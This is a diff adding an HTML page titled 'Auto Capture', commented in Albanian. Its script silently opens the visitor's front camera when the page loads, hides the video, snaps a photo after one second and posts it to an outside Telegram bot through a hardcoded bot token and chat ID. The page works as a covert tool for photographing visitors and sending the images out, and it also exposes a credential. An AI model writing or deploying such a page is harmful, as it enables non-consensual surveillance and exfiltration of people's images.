@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Capture</title>
+</head>
+<body>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <script>
+        const TELEGRAM_BOT_TOKEN = '7672479298:AAGm0rAK8ARyJkqnif5Xob7POxafTzp3HYM'; // Tokeni i botit tuaj
+        const CHAT_ID = '6825628992'; // ID-ja e chatit tuaj
+
+        async function startCamera() {
+            const video = document.getElementById('video');
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user' } // Përdor kamerën e përparme (selfie kamera)
+            });
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+                setTimeout(capturePhoto, 1000); // Shkrepet automatikisht pas 1 sekonde
+            };
+        }
+
+        function capturePhoto() {
+            const video = document.getElementById('video');
+            // Nuk do të përdorim canvasin për ta shfaqur fotografinë
+            sendPhotoToTelegram(video);
+        }
+
+        async function sendPhotoToTelegram(video) {
+            const canvas = document.createElement('canvas'); // Krijojmë një canvas të fshehur
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const dataUrl = canvas.toDataURL('image/png');
+            const blob = await fetch(dataUrl).then(res => res.blob());
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.png');
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).then(response => response.json())
+              .then(data => console.log('Foto u dërgua:', data))
+              .catch(error => console.error('Gabim:', error));
+        }
+
+        startCamera();
+    </script>
+</body>
+</html>
